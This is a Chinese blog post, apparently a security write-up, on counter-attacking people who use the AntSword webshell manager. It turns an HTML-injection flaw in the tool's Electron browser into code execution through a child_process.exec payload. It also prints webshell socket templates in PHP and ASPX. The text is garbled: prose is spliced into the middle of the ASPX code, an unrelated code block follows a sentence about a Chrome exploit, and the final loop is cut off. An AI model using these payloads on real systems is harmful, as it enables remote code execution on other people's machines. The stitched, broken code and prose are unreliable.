0x01 前言
中午在学校午休，就看了 @忍酱 的反制Goby， @暗羽师傅 的反制Burpsuite还有 @先知社区 里的反制蚁
剑, @f4ltJ4y 的蚁剑复现，挑起了我想反制的心！
蚁剑版本: 2.1.12
0x02 虚假XSS
蚁剑是自带浏览器的，用的是Chrome！本想着暗羽师傅的那篇可以用得到，发现版本不对
发现它调用了dhtmlx框架，可以解析HTML
正是因为这个虚假的XSS，更加激发了我想RCE的心！
我们可以参考：
https://xz.aliyun.com/t/8167
0x03 放弃RCE
我在想既然有内置浏览器，那么 Chromium浏览器 版本是否存在漏洞呢？
我们先得获取Chromuim版本
如上图，谷歌浏览器的产品代号为"Mozilla"
上图已知， Chrome/69.0.3497.106 Electron/4.0.3
我们查找相对应的远程代码执行的漏洞！
# Console
navigator.appCodeName
navigator.appVersion
"5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 
antsword/2.1.12 Chrome/69.0.3497.106 Electron/4.0.3 Safari/537.36"
已关闭沙箱
通过万能的百度我找到一个 Google Chrome 
'use strict'
class Core {
  constructor(ShellCore, opt = {}) {
    this.ShellCore = ShellCore;
    this.host = opt['host'] || "127.0.0.1:6379";
  }
  setHost(host) {
    this.host = host;
  }
  // 将 buffer 转为 base64 string
  encode(buffer) {
    return Buffer.from(buffer).toString('base64');
  }
  decode(str) {
    if (str.indexOf('ERROR://') > -1) {
      throw new Error(str);
    }
    let b64buff = Buffer.from(str, 'base64');
    if (b64buff.toString().indexOf('ERROR://') > -1) {
      throw new Error(b64buff.toString());
    }
    return b64buff;
  }
  get template() {
    let that = this
    return {
    'php': (cmdbuf) => {
      return {
        _: `$cmd=base64_decode("${that.encode(cmdbuf)}");
$conn=@stream_socket_client("tcp://${that.host}", $errno, $errstr, $timeout=30);
if(!$conn){
echo "LUVSUiBDb25uZWN0aW9uIFJlZnVzZWQ=";
}else{
@fwrite($conn,$cmd,strlen($cmd));
$resp=@fread($conn, 8196);
@stream_set_blocking($conn,0);
while($buf=@fread($conn,8196)){$resp.=$buf;}
stream_set_blocking($conn, 1);
echo base64_encode($resp);
@stream_socket_shutdown($conn,STREAM_SHUT_RDWR);
@fclose($conn);
}`
        }
      },
      'asp': (cmdbuf) => {
        return {
          _: ``
        }
      },
      'aspx': (cmdbuf) => {
        return {
          _: `try{
var ipAddress = "${that.host.split(':')[0]}";
var portNum = ${that.host.split(':')[1]};
var sendbytes = System.Convert.FromBase64String("${that.encode(cmdbuf)}");
var remoteEndPoint = new 
System.Net.IPEndPoint(System.Net.IPAddress.Parse(ipAddress), portNum);
var client = new System.Net.Sockets.Socket(
    System.Net.Sockets.AddressFamily.InterNetwork,
    System.Net.Sockets.SocketType.Stream,
构造 Self-RCE
结合蚁剑的以下特点：
解析HTML时，不能使用单引号或双引号，否则会出现语法混乱
HTML源码和流量中均有Payload，导致攻击方很容易被反制,在执行命令后需要删除当前HTML节
点，并对流量进行加密。
    System.Net.Sockets.ProtocolType.Tcp
);
client.Connect(remoteEndPoint);
client.Send(sendbytes);
var recvStr = "";
var bytes = 0;
var receiveBuffer = new byte[1024];
do {
    bytes = client.Receive(receiveBuffer, receiveBuffer.Length, 
System.Net.Sockets.SocketFlags.None);
    recvStr += System.Text.Encoding.UTF8.GetString(receiveBuffer, 0, bytes);
}while (bytes == 1024);
client.Shutdown(System.Net.Sockets.SocketShutdown.Both);
client.Close();
Response.Write(System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(
recvStr)));
} catch (err) {
Response.Write(System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(
"ERROR:// " + err.message)));
}
`
        }
      },
      'jsp': (cmdbuf) => {
        return that.ShellCore.other.redisconn({
          addr: that.host,
          context: cmdbuf
        })
      }
    }
  }
}
module.exports = Core;
a="require('child_process').exec('calc.exe')"
b=""
for(i=0;i